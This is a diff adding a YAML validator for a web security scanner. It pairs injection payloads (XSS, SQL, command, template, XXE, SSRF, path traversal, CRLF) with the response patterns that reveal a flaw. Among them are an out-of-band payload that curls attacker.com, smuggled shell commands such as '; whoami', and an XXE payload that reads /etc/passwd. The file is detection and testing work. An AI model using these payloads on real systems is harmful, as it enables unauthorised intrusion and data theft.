@@ -1,0 +1,288 @@
+# Validators - Reflection and Injection Detection
+# Detect payload reflection and injection points in responses
+
+validator_category: "reflection"
+version: "1.0"
+
+# XSS Reflection Detection
+xss_reflection:
+  basic_detection:
+    description: "Check if input is reflected in response"
+    test_payload: "<script>alert('REFLECTION_TEST_12345')</script>"
+    detection_patterns:
+      - "<script>alert('REFLECTION_TEST_12345')</script>"  # Exact reflection
+      - "alert('REFLECTION_TEST_12345')"  # Partial reflection
+      - "REFLECTION_TEST_12345"  # String reflection
+  
+  context_analysis:
+    html_body:
+      test: "<img src=x onerror=alert(1)>"
+      reflected_in: "<div>user input: <img src=x onerror=alert(1)></div>"
+      vulnerable: true
+    
+    html_attribute:
+      test: '" onload="alert(1)'
+      reflected_in: '<input value="[USER_INPUT]">'
+      result: '<input value="" onload="alert(1)">'
+      vulnerable: true
+    
+    javascript_context:
+      test: "';alert(1)//"
+      reflected_in: "var user = 'USER_INPUT';"
+      result: "var user = '';alert(1)//';"
+      vulnerable: true
+    
+    url_context:
+      test: "javascript:alert(1)"
+      reflected_in: "<a href='USER_INPUT'>"
+  encoding_detection:
+    html_encoded:
+      input: "<script>alert(1)</script>"
+      reflected: "&lt;script&gt;alert(1)&lt;/script&gt;"
+      vulnerable: false
+      note: "HTML entities prevent execution"
+    
+    javascript_escaped:
+      input: "'; alert(1); //"
+      reflected: "\\'; alert(1); //"
+      vulnerable: false
+      note: "Backslash escaping"
+    
+    url_encoded:
+      input: "<script>alert(1)</script>"
+      reflected: "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+      vulnerable: false
+
+# SQL Injection Reflection
+sql_injection_reflection:
+  error_based:
+    payload: "' OR '1'='1"
+    reflected_errors:
+      mysql:
+        - "You have an error in your SQL syntax"
+        - "near '' OR '1'='1'"
+      postgresql:
+        - "ERROR: syntax error at or near"
+      mssql:
+        - "Unclosed quotation mark after the character string"
+    vulnerable: "Error message contains injected payload"
+  
+  union_based:
+    payload: "' UNION SELECT NULL--"
+    detection:
+      - "Response includes unexpected NULL values"
+      - "Column count changes in result"
+      - "Different data types returned"
+  
+  boolean_based:
+    payload_true: "' OR '1'='1'--"
+    payload_false: "' OR '1'='2'--"
+    detection: "Different responses for true/false conditions"
+    vulnerable_if: "True condition shows more data than false"
+
+# Command Injection Reflection
+command_injection_reflection:
+  basic_detection:
+    linux:
+      - payload: "; whoami"
+        reflected: "www-data"  # or actual username
+      - payload: "| id"
+        reflected: "uid=33(www-data)"
+      - payload: "`uname -a`"
+        reflected: "Linux hostname"
+    
+    windows:
+      - payload: "& whoami"
+        reflected: "nt authority\\system"
+      - payload: "| hostname"
+        reflected: "SERVER01"
+  
+  time_based:
+    payload: "; sleep 10"
+    detection: "Response delayed by 10 seconds"
+    note: "No visible reflection, but timing proves execution"
+  
+  out_of_band:
+    payload: "; curl http://attacker.com/callback"
+    detection: "HTTP request received at attacker server"
+
+# LDAP Injection Reflection
+ldap_injection_reflection:
+  payload: "*)(uid=*))(|(uid=*"
+  detection:
+    - "Multiple user records returned"
+    - "Unauthorized user enumeration"
+    - "Admin accounts visible"
+
+# Template Injection Reflection
+template_injection:
+  detection_payloads:
+    jinja2: "{{ 7*7 }}"
+    expected: "49"
+    
+    freemarker: "${7*7}"
+    expected: "49"
+    
+    velocity: "#set($x=7*7)$x"
+    expected: "49"
+    
+    twig: "{{ 7*7 }}"
+    expected: "49"
+  
+  rce_detection:
+    payload: "{{ config.items() }}"
+    reflected: "Application configuration dumped"
+    vulnerable: true
+
+# NoSQL Injection Reflection
+nosql_injection:
+  mongodb:
+    payload: '{"$ne": null}'
+    detection: "All records returned instead of specific user"
+  
+  json_injection:
+    payload: '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+    detection: "Authentication bypass, logged in as first user"
+
+# XML/XXE Reflection
+xxe_reflection:
+  payload: |
+    <?xml version="1.0"?>
+    <!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <root>&xxe;</root>
+  
+  detection:
+    direct: "root:x:0:0:root:/root:/bin/bash"
+    blind: "HTTP request to attacker server with file contents"
+
+# SSRF Reflection
+ssrf_reflection:
+  direct_ssrf:
+    payload: "http://169.254.169.254/latest/meta-data/"
+    reflected: "ami-id, hostname, security-credentials"
+    vulnerable: true
+  
+  blind_ssrf:
+    payload: "http://burpcollaborator.net"
+    detection: "DNS query or HTTP request logged at collaborator"
+    no_reflection: "Response doesn't show data but request was made"
+
+# Path Traversal Reflection
+path_traversal_reflection:
+  payload: "../../../../etc/passwd"
+  reflected: "root:x:0:0:root:/root:/bin/bash"
+  vulnerable: true
+  
+  partial_reflection:
+    payload: "../../../../etc/passwd"
+    reflected: "root:x:0:0:"  # Truncated
+    still_vulnerable: true
+
+# Header Injection Reflection
+header_injection:
+  crlf_injection:
+    payload: "test\r\nX-Injected: true"
+    reflected_headers: |
+      HTTP/1.1 200 OK
+      X-Custom-Header: test
+      X-Injected: true
+    vulnerable: true
+  
+  host_header_injection:
+    payload: "Host: attacker.com"
+    reflected: "Password reset link: https://attacker.com/reset?token=ABC"
+    vulnerable: true
+
+# Response Time Analysis
+timing_analysis:
+  sql_sleep:
+    payload: "' OR SLEEP(5)--"
+    expected_delay: "5 seconds"
+    baseline: "100ms"
+    detection: "Significant delay indicates blind SQLi"
+  
+  command_sleep:
+    payload: "; sleep 10"
+    expected_delay: "10 seconds"
+  
+  regex_dos:
+    payload: "a{10000}"
+    expected: "CPU spike and delayed response"
+    note: "Regular expression denial of service"
+
+# Response Size Analysis
+size_analysis:
+  idor:
+    user_1: "GET /api/user/1 → 5000 bytes"
+    user_2: "GET /api/user/2 → 5000 bytes"
+    user_999: "GET /api/user/999 → 403 Forbidden (200 bytes)"
+    vulnerable: "Size difference reveals access control"
+  
+  sql_union:
+    baseline: "SELECT * FROM users WHERE id=1 → 1 row"
+    injection: "' UNION SELECT NULL, NULL, NULL-- → 3 columns detected"
+    detection: "Response includes extra NULL values"
+
+# Content Type Reflection
+content_type_confusion:
+  json_injection:
+    request: 'Content-Type: application/json\n{"user":"admin"}'
+    reflected_as: "text/html"
+    detection: "JSON parsed as HTML, XSS possible"
+  
+  xml_injection:
+    request: 'Content-Type: text/xml\n<?xml version="1.0"?><user>admin</user>'
+    reflected_as: "application/json"
+    detection: "Content-type confusion"
+
+# DOM-based Reflection
+dom_reflection:
+  location_hash:
+    payload: "#<img src=x onerror=alert(1)>"
+    javascript: "document.write(location.hash)"
+    reflected: "DOM contains malicious script"
+    vulnerable: true
+  
+  postmessage:
+    payload: "postMessage('<script>alert(1)</script>', '*')"
+    reflected: "Message handled without sanitization"
+
+# Automated Detection Tools
+automated_detection:
+  burp_scanner:
+    - "Active scan for injection points"
+    - "Payload reflection analysis"
+    - "Context-aware testing"
+  
+  owasp_zap:
+    - "Active scan with reflection detection"
+    - "Spider to find all input points"
+  
+  custom_scripts:
+    - "Send unique payload to each parameter"
+    - "Search response for payload"
+    - "Analyze reflection context"
+
+# Validation Patterns
+validation_patterns:
+  successful_reflection:
+    - "Input exactly as submitted"
+    - "Input with minimal encoding"
+    - "Input in executable context"
+  
+  unsuccessful_reflection:
+    - "Input heavily encoded"
+    - "Input stripped/filtered"
+    - "Input in safe context (e.g., HTML entity encoded)"
+  
+  partial_reflection:
+    - "Input truncated"
+    - "Special characters removed"
+    - "Input modified but still dangerous"
+
+references:
+  - "OWASP Testing Guide: Reflected Input"
+  - "PortSwigger: Context-specific XSS"
+  - "Payload reflection analysis techniques"
